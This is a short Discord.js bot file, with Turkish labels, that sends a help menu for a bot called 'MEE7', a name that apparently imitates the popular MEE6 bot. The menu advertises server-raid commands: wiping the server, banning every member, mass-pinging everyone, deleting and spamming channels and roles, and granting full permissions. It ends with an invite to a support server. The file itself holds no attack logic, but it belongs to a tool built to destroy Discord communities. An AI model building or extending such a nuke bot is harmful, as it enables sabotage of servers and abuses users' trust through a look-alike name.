const Discord = require('discord.js');

exports.run = function(client, message) {
const codeplus = new Discord.RichEmbed()
.setColor('RANDOM')
.setTitle('MEE7 Commands')
.setTimestamp()
.addField('Sunucuyu Yok Eder', '+destur')
.addField('Sunucudaki Herkesi Banlar', '+ban')
.addField('Everyone Spamlar', '+ever-spam')
.addField('Kanalları Siler', '+kanal-sil')
.addField('Kanal Spamlar', '+kanal-spam')
.addField('Tüm Rolleri Siler', '+rol-sil')
.addField('Rol Spamlar', '+rol-spam')
.addField('Full Yetki Verir', '+yetki-ver')
.addField('Destek Sunucusu', 'https://discord.gg/faTjBR4')
.setFooter('MEE7 Commands', client.user.avatarURL)
.setThumbnail(client.user.avatarURL)
message.channel.send(codeplus)
};

exports.conf = {
  enabled: true,
  guildOnly: false, 
  aliases: [], 
  permLevel: 0
};

exports.help = {
  name: 'yardım'
};
